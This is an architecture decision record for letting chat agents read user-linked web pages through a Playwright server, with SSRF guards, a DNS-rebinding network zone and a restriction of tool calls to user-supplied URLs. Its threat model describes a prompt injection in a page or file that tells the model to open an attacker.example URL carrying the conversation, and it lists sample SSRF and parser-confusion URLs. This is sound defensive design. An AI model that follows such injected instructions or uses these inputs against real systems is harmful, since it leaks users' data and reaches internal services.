# Agents Read Linked Web Pages Through the Platform's Playwright Server

## Context

Users paste links into agent chats, or reference a page with `#https://…` in Open WebUI, and expect the answer to come
from that page. Our agents ignored URLs in the message, and Open WebUI fetches a `#` reference itself as soon as it is
picked, so the agent never saw it. Issue #1569 asks agents to read the linked pages, answer from them, cite them, report
the ones they could not read, and trace every fetch.

Reading a page the user chose is a request from inside the platform to an address an outsider controls:

- **Server-side request forgery.** The request leaves from a container that shares networks with internal services. A
  link to `http://litellm:4000`, to a private address, or to a name that resolves to one, would read an internal service
  instead of a web page.
- **Exfiltration.** A model that may choose URLs can be told, by an instruction hidden in a page or an attached file, to
  open `https://attacker.example/?q=<conversation>`. The fetch itself sends the data.
- **Cost of a turn.** Pages are read before the answer starts and go whole into the prompt.

The platform already runs a Playwright server, used by Open WebUI's web loader. Which fetch engine the platform runs in
the long term (Firecrawl is proposed) is issue #1605; web search is #1568.

## Decision Drivers

- **Every fetch is ours to trace.** A page the answer rests on shows in the event history and the agent trace.
- **Internal services are unreachable from a page load**, whatever the URL or its DNS says.
- **The model cannot send conversation data to a URL nobody linked.**
- **Off unless an admin turns it on.** Fetching sends a request from the platform to a site the user chose.
- **Report, never invent.** A page that could not be read is named in the answer, with the reason.
- **No new service.** Reuse the Playwright server the platform already operates.

## Decision

### A web fetch capability, off by default

`WebFetch` is a capability on the conversational spine (ADR `2026_09_28_capabilities_and_the_conversational_spine`):

- **On fixed-flow blueprints** (Instructed Assistant, Document Intelligence Assistant, Company Knowledge Agent) it reads
  every link in the message and every `#` reference next to memory, files and knowledge. RAG's sufficiency check weighs
  the pages, so a question a page answers is not rejected for retrieval finding nothing.
- **On the Universal Agent** it is a tool, offered only when the message links pages.
- **The Web Page Assistant** (`WebFetchAgent`) is a dedicated blueprint: the Instructed Assistant's steps with web fetch
  required.

Each profile has a nullable `web_fetch` section, `null` (off) for stored and new profiles. Its limits are links per
message (5), seconds per page (15) and characters per page (20,000, cut at a paragraph break). With fetching off and a
link in the message, the model is told it cannot open links: without that note, a model handed a bare URL summarised the
page it imagined.

### The engine: the shared Playwright server

The agent connects to `ws://playwright:3000` with the Playwright 1.63 client, renders the page, and Trafilatura keeps
the main content as markdown. Each page becomes one node, rendered and cited like a retrieved document. The result event
is a semantic event, so the fetch shows in Langfuse as a retrieval with the pages as its documents. Malformed and
non-http(s) links, timeouts, 4xx/5xx answers, non-HTML content (PDFs, downloads) and pages without text are reported per
link. Failing to reach the browser server raises: that is a platform fault, not an unreadable page.

### A URL guard on every request of the page

`RequestGuard` routes every request the page makes, the navigation, each redirect hop, subresources and worker scripts,
and performs it only after `UrlSafetyPolicy` accepts the URL. A catch-all route on the browser context refuses requests
from pages the fetched page opens (popups). The policy refuses:

- schemes other than http(s), and internal names: `localhost`, names without a dot (such as `litellm`), and names ending
  in `.localhost`, `.local`, `.internal` or `.home.arpa`,
- addresses that are not global, including IPv4 hidden in NAT64 and 6to4 IPv6 addresses, after resolving the name,
- URLs Python and the browser could read as different hosts: a backslash, `@`, `%` or non-ASCII character in the host
  part, and control characters or spaces anywhere. Python and WHATWG disagree on `http://127.0.0.1\@cdn.example` and on
  IDNA (`faß` becomes `fass` in Python, `xn--fa-hia` in the browser), so an ambiguous URL is refused rather than parsed.

### A `browser` network zone

The guard resolves a name in the agent; `route.fetch` then sends the request from the Playwright server, which resolves
it again. A name can answer with a public address to the first lookup and an internal one to the second (DNS rebinding),
and no URL check closes that window. So the browser must not share a network with internal services: Playwright leaves
`backend` for its own internal `browser` zone, shared only with its callers (`open-webui` and the agents that fetch
pages), and keeps `egress` for the internet. This amends ADR `2025_12_22_docker_network_isolation` the way
`code-sandbox` did for open-terminal.

### The tool reads only the pages the user linked

The Universal Agent's tool lists the message's links in its description and accepts only those, matched exactly. A call
naming any other URL is refused whole, so an injected instruction cannot make the model open a URL of its own. The
alternative, letting linked pages through and asking the user to approve any other URL, needs approval per argument in
the tool loop, which does not exist yet; web search (#1568) faces the same question.

### The pipe forwards references, not content

The Open WebUI pipe sends a `#https://…` reference to the agent as `UserMessageEvent.web_references` and drops the
content Open WebUI fetched, so the agent reads the page through the guard and the trace. It maps the agent's events to a
status while pages load, one source chip per page read, and an error status naming the pages that failed.

## Alternatives Considered

- **Use the content Open WebUI fetched.** Untraced, covers `#` references only (not pasted links), and fetched without
  our guard.
- **An HTTP client in the agents.** No JavaScript rendering, and every agent would need internet access, widening the
  network exposure the zone is meant to shrink.
- **The URL guard without a network zone.** Leaves DNS rebinding open, with ~38 services, the Docker socket proxy among
  them, one hop away from the browser.

## Consequences

### Positive

- Pasted links and `#` references are read the same way, cited as sources, and recorded as a retrieval in the trace.
- A page load cannot reach `backend`, `data` or `storage`: only the six callers share a network with the browser.
- A prompt injection cannot pick the URL the platform opens.

### Negative

- **Long prompts.** Five pages can add about 25,000 tokens. On 2026-10-20, Gemma at the provider streamed a 15,000-token
  prompt at 1.7 tokens per second against 23 for a short one, so a turn with several pages can take minutes. Admins tune
  the limits per profile.
- **Every new agent that fetches pages must join `browser`**, or it cannot reach `ws://playwright:3000`.
- **The server and its clients upgrade together.** Playwright refuses a client of another version ("Playwright version
  mismatch"), so a new Playwright server image needs the agents' `playwright` package bumped to the same version, like
  Open WebUI's image.
- **Dev does not exercise the zone.** Dev agents and Open WebUI reach Playwright through `localhost:3036`, so the
  network change is verified on a deployed stage (nightly).
- **A failed `#` reference never reaches the agent.** Open WebUI 0.11.3 fetches it itself when it is picked and drops it
  with its own message when that fails. Deferred.
- **Non-HTML links are not read.** PDFs and downloads are reported as unsupported; video pages give little text.
